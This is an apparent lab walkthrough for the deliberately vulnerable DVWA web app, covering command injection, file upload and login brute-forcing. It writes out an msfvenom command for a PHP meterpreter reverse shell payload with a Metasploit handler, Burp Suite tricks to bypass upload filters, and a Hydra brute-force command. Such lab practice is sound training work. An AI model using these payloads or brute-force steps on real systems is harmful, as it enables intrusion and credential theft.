# DVWA 

---------------------------

## Command Injection

Command injection let you perform commands on the textbox that is intended for another task such in this case, ping a host.

Connectors can be used here to add a command which will run with the action (or not) that this textbox is intended for:

![image](https://github.com/ELRame/HackingTools/assets/82544416/88a0d631-49be-4e91-afee-22850eccc81c)

Other connectors u can use are: **&&** **&** **;**

With this in mind, and changing the difficulty on DVWA you can take a look at the source code to see if there is some character escaped/blacklisted:

![image](https://github.com/ELRame/HackingTools/assets/82544416/d25a3f58-8f92-40e7-98db-784ea3507280)

---------------------------------

## File Upload

File upload allows you to upload a malicious file into the dvwa directory, with a reverse meterpreter connection, you will be able to run commands on it.

Run msfconsole and search for multi handler:

![image](https://github.com/ELRame/HackingTools/assets/82544416/5e93e9b8-42cf-445a-80c3-fb1750c094a6)

Select the number 30 with ````use 30```` (multi/handler) and set the payload as ````php/meterpreter/reverse_tcp````

![image](https://github.com/ELRame/HackingTools/assets/82544416/7e48c7ee-f1a0-4577-933c-d41c8c2290fc)

Then type ````show options```` to get the fields you need to fill, in this case LHOST, which can be set with ````set LHOST youripmachine```` that in this case is **127.0.0.1** (localhost) since we are running dvwa in the same machine

![image](https://github.com/ELRame/HackingTools/assets/82544416/dcbf1fde-19cd-404d-ae0e-bd91972b9b52)

After this you can create the payload for dvwa with **msfvenom** using the folloring command:

````
msfvenom -p php/meterpreter/reverse_tcp LHOST=youripmachine LPORT=4444 -f raw >malfile.php
````

![image](https://github.com/ELRame/HackingTools/assets/82544416/ea79972c-b9ef-4c1a-acf4-75a3adf10b85)

After this you can go to dvwa and upload the file, once uploaded, you have to go back to metasploit and run the command ````run```` or ````exploit```` in order to put it in listening state:

![image](https://github.com/ELRame/HackingTools/assets/82544416/9ba1a9da-0a65-46ae-b255-b11891429edd)

Now, on dvwa copy the path where the file was uploaded and put it in the url address:

![image](https://github.com/ELRame/HackingTools/assets/82544416/3eec3d74-ba1f-4f7d-ad0d-5f93f0e7a6e0)

After that, go to the url and the meterpreter session should be running:

![image](https://github.com/ELRame/HackingTools/assets/82544416/385b87cc-915d-466f-bc52-b132aec04276)

![image](https://github.com/ELRame/HackingTools/assets/82544416/cbd56dcc-72dd-4736-b78e-9e659f4a3f9e)

### Medium Difficulty

On medium, dvwa verify that the actual file is the type allowed, so for this we use burpsuite to intercept the traffic and change the type on the header before we forwarded to the browser.

First go to the extension you have for proxy and select the one you already (or you should) set up, in this case i named it BurpSuite:

![image](https://github.com/ELRame/HackingTools/assets/82544416/4d6e681e-dd19-4e64-8d92-2e4fc80afb50)

After that, on BuprSuite go to **proxy** manu and turn on the intercept option:

![image](https://github.com/ELRame/HackingTools/assets/82544416/1bbbdfdd-a2ef-4ec7-9748-e4e3b330ce05)

Then go to upload the file and press upload, this make burpsuite pop up with the header, find the **type** and change it for ````image/jpeg````, then click in the **forward** button:

![image](https://github.com/ELRame/HackingTools/assets/82544416/ad1f49b5-faa5-4a3e-96b7-fe3aba14750d)

![image](https://github.com/ELRame/HackingTools/assets/82544416/9e996c60-524d-4abe-b6b7-7e5f89c1dfb8)

Now just follow the same steps than the first example and you'll have a meterpreter session.

------------------------------------

## Brute Force

To brute force credentials on dvwa we are goin to use BurpSuite and also Hydra:

First set difficulty to low, go to bruteforce tab, and turno on your foxyproxy extension and Burpsuite intercept on, put any credentials and click on submit:

![image](https://github.com/ELRame/HackingTools/assets/82544416/24b4ebac-1eb5-4d3d-8425-e7f4475eb154)

Right click on burpsuite interception and choose sent to intruder. Once you get there, just clear the variables and select only the password:

![image](https://github.com/ELRame/HackingTools/assets/82544416/d9d65d86-e592-4f30-81f7-c14b9fdf7f56)

Then click on the payloads tab and load your wordlist:

![image](https://github.com/ELRame/HackingTools/assets/82544416/68262b59-3f3c-4213-8263-41cd39856f7f)

Click on Start attack and sort the information by asc length, the first one you found with different length, that's the password:

![image](https://github.com/ELRame/HackingTools/assets/82544416/a823c154-2bca-496a-9a40-9ba0f189a1b6)

And you are done

**Hydra**

````
hydra -l admin -P /usr/share/wordlists/john.lst 'http-get-form://127.0.0.1:42001/vulnerabilities/brute/:username=^USER
^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=CookieSession; security=low:F=Username and/or
password incorrect' -I
````

### High difficulty

Here we need to follow the same steps until we sent the interception to the intruder, there, we change the attack type to "PitchFork" and select as target both password and user_token field:

![image](https://github.com/ELRame/HackingTools/assets/82544416/0e63b203-9aa0-42dc-ba8e-81abd946413b)

Select the wordlist and after that change the set payload:

![image](https://github.com/ELRame/HackingTools/assets/82544416/b9fa4999-482e-477a-8df0-c7638ffb1020)

Now go to Setting tab and go to Grep Extract option and click on add, there click on fetch response and look for the token, select it and click in ok button:

![image](https://github.com/ELRame/HackingTools/assets/82544416/dc40bd3e-f1f8-4d48-91c4-a4c5767ca45b)

In Grep Match option click on clear button and then add "Incorrect"

![image](https://github.com/ELRame/HackingTools/assets/82544416/6b6f6f27-22e5-430f-98d2-fb1269ee4b46)

Set Redirection option to Always:

![image](https://github.com/ELRame/HackingTools/assets/82544416/559ec62c-f3c9-47c5-ade8-edc97e3c8692)

After that, go to Resource Pool, add a new pool and set the limit to 1 and click on start attack:

![image](https://github.com/ELRame/HackingTools/assets/82544416/7cdc21ae-d3ea-47c7-970d-1741e2e0e8e1)

After this, should have the pass:

![image](https://github.com/ELRame/HackingTools/assets/82544416/874b2e8b-637a-4a13-8116-54f8822ba545)
